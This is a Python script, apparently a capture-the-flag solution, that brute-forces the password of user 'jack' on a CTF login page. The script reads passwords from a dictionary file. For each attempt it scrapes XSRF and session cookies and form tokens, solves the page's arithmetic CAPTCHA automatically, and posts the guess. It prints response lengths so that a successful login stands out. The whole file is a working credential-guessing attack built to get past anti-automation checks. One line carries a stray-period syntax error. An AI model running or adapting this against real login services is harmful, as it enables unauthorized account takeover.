#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
import sys

if __name__ == "__main__":
	file_name = sys.argv[1]        # loading dictionary file
	print(file_name)
	with open(file_name, "r") as f:
		file_text = f.read()
		passwdlist = file_text.split('\n')

	for pwd in passwdlist:

		URL = "http://ctf.sharif.edu:8084/login"     # request URL

		req_1 = requests.get(URL)					# request url with get method
		Cookie = req_1.headers['Set-Cookie']		# fetch Cookies from the header
		tmp_cookie = Cookie.split("=")
		XSRF_TOKEN = tmp_cookie[1].split(";")[0]
		laravel_session = tmp_cookie[5].split(";")[0]
		cookies = {											# set cookie field 
			'wordpress_test_cookie' : 'WP+Cookie+check',
			'XSRF_TOKEN' : XSRF_TOKEN,
			'laravel_session' : laravel_session
		}

		soup = BeautifulSoup(req_1.text, "html.parser")		# beautifulsoup parsering html

		line = soup.find('input', attrs={'name': 'SecQuestion'}). # finding specific tag with attr restrict
		result = line.prettify()			# convert object into str
		tmp_result = result.split(" ")
		tmp_result = tmp_result[4:7]
		tmp_result[0] = tmp_result[0].split("\"")[1]

		a = int(tmp_result[0])
		o = tmp_result[1]
		b = int(tmp_result[2])

		if tmp_result[1] == 'x':			# calculate verification code 
			r = a * b
		elif tmp_result[1] == '+':
			r = a + b
		elif tmp_result[1] == '-':
			r = a - b

		field_line = soup.find('input', attrs={'name' : 'field'})
		field_text = field_line.prettify()
		token_line = soup.find('input', attrs={'name' : '_token'})
		token_text = token_line.prettify()

		field = field_text.split('"')[5]
		_token = token_text.split('"')[5]

		data={						# set data field for request GET or POST
			'Username' : 'jack',
			'Password' : str(pwd),
			'SecQuestion' : str(r),
			'field' : field,
			'_token' : _token,
			'Submit' : 'Login'
		}

		req_2 = requests.post('http://ctf.sharif.edu:8084/signin',data=data, cookies=cookies)	#request with POST method
		#print(req_2.text)
		print("LoginPasswd: ", pwd, "Responselen: ", len(req_2.text))
		














